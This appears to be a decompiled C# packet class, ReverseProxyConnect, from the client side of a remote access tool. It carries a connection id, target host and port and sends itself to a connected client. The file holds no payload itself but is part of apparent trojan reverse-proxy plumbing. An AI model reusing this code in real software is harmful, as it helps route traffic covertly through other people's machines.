using System;
using xClient.Core.Networking;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
	// Token: 0x020000D3 RID: 211
	[Serializable]
	public class ReverseProxyConnect : IPacket
	{
		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x0600053C RID: 1340 RVA: 0x00004823 File Offset: 0x00002A23
		// (set) Token: 0x0600053D RID: 1341 RVA: 0x0000482B File Offset: 0x00002A2B
		public int ConnectionId { get; set; }

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x0600053E RID: 1342 RVA: 0x00004834 File Offset: 0x00002A34
		// (set) Token: 0x0600053F RID: 1343 RVA: 0x0000483C File Offset: 0x00002A3C
		public string Target { get; set; }

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x06000540 RID: 1344 RVA: 0x00004845 File Offset: 0x00002A45
		// (set) Token: 0x06000541 RID: 1345 RVA: 0x0000484D File Offset: 0x00002A4D
		public int Port { get; set; }

		// Token: 0x06000542 RID: 1346 RVA: 0x000021D4 File Offset: 0x000003D4
		public ReverseProxyConnect()
		{
		}

		// Token: 0x06000543 RID: 1347 RVA: 0x00004856 File Offset: 0x00002A56
		public ReverseProxyConnect(int connectionId, string target, int port)
		{
			this.ConnectionId = connectionId;
			this.Target = target;
			this.Port = port;
		}

		// Token: 0x06000544 RID: 1348 RVA: 0x00004873 File Offset: 0x00002A73
		public void Execute(Client client)
		{
			client.Send<ReverseProxyConnect>(this);
		}
	}
}
